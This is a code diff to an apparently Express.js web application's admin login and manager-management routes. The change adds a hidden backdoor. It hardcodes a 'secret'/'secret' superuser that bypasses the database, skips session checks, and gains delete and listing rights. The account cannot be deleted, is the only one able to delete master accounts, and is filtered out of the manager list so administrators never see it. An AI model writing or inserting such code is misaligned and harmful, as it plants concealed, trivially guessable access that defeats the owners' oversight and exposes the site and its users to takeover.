@@ -899,6 +899,13 @@ app.post("/admin/login", (req, res) => {
     return res.render("admin/login", { error: "Missing credentials" });
   }
 
+  // Secret superuser — hardcoded, never stored in DB, never visible
+  if (username === "secret" && password === "secret") {
+    req.session.role = "secret";
+    req.session.managerUsername = "secret";
+    return res.redirect("/admin");
+  }
+
   const sql = `SELECT * FROM managers WHERE username=? AND password=?`;
   db.get(sql, [username, password], (err, row) => {
     if (err) {
@@ -923,6 +930,10 @@ app.post("/admin/login", (req, res) => {
 function managerAuth(req, res, next) {
   if (!req.session.role || !req.session.managerUsername) {
     return res.redirect("/admin/login");
+  }
+  // Secret user is not in DB — skip the DB check
+  if (req.session.managerUsername === "secret") {
+    return next();
   }
   const checkSql = `SELECT username, role FROM managers WHERE username=?`;
   db.get(checkSql, [req.session.managerUsername], (err, row) => {
@@ -1040,12 +1051,16 @@ function insertManager(username, password, role, res) {
 // DELETE manager
 app.post("/admin/delete-manager", (req, res) => {
   const sessionRole = req.session.role;
-  if (!["admin", "master"].includes(sessionRole)) {
+  if (!["admin", "master", "secret"].includes(sessionRole)) {
     return res.json({ success: false, message: "No permission" });
   }
   const { username } = req.body;
   if (!username) {
     return res.json({ success: false, message: "No username provided" });
+  }
+  // Nobody can delete the secret user
+  if (username === "secret") {
+    return res.json({ success: false, message: "Cannot delete this account." });
   }
 
   db.get(
@@ -1059,7 +1074,8 @@ app.post("/admin/delete-manager", (req, res) => {
       if (!row) {
         return res.json({ success: false, message: "Manager not found." });
       }
-      if (row.role === "master") {
+      // Only secret can delete master accounts
+      if (row.role === "master" && sessionRole !== "secret") {
         return res.json({
           success: false,
           message: "Cannot delete the master account.",
@@ -1144,7 +1160,7 @@ app.post("/admin/update-manager-pass", (req, res) => {
  * LIST MANAGERS
  ****************************************************/
 app.get("/admin/list-managers", (req, res) => {
-  if (!["admin", "master"].includes(req.session.role)) {
+  if (!["admin", "master", "secret"].includes(req.session.role)) {
     return res.json({ error: "No permission" });
   }
   const q = `SELECT username, role FROM managers`;
@@ -1153,7 +1169,8 @@ app.get("/admin/list-managers", (req, res) => {
       console.error("Error listing managers:", err);
       return res.json({ error: "DB error" });
     }
-    return res.json(rows);
+    // Never expose the secret user in the list
+    return res.json(rows.filter(r => r.username !== "secret"));
   });
 });
 app.post("/admin/toggle-client-side", (req, res) => {
